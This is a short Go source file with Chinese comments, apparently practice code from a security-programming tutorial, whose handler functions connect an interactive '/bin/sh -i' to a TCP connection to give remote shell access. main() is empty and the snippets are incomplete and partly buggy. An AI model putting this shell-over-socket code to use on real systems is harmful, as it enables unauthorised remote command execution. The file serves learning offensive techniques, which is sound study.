package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

// 劫持命令行替换自己的
func main() {

}

// 更加优雅的写法
// pipe 会同时创建同步链接 一个reader和一个writer任何被写入writer的数据（在本示例种wp）会被reader（rp）读取
// 将 writer分配个cmd 然后使用 io.copy将PipeReader 链接到Tcp使用 goroutine防止代码被阻塞
func handle02(conn net.Conn) {
	cmd := exec.Command("bin/sh", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

// handle 不知道是不是版本问题
func handle(conn net.Conn) {
	// 显示调用 /bin/sh 并使用-i 进入交互模式
	// 这样就可以用他做标准的输入或输出
	// 对于windows 使用 exec.command("cmd.exe")
	cmd := exec.Command("/bin/sh", "-i")
	// 将标准输出设置为我们的联机
	cmd.Stdin = conn
	// 从链接创建一个Flusher 用于标准输出
	// 这样可以确保标准输出被充分刷新并通过 net.Conn发送
	//cmd.Stdout = NewFlusherL(conn)
	// 运行命令行
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

// =======================================================
// Windows系统
// 包装bufio.writer 显示刷新所有写入
type Flusher struct {
	w *bufio.Writer
}

// newFlusher 从io.writer 创建一个新的flusher
func NewFlusherL(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// 写入数据并显示刷新缓冲
func (foo *Flusher) Writer(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return count, err
	}
	return count, err
}

// =====================================================================
// Linux 系统上运行
func execL(conn net.Conn) {
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn

	// 完成命令和数据流处理设置之后
	err := cmd.Run()
	if err != nil {
		// 异常处理
		return
	}
}
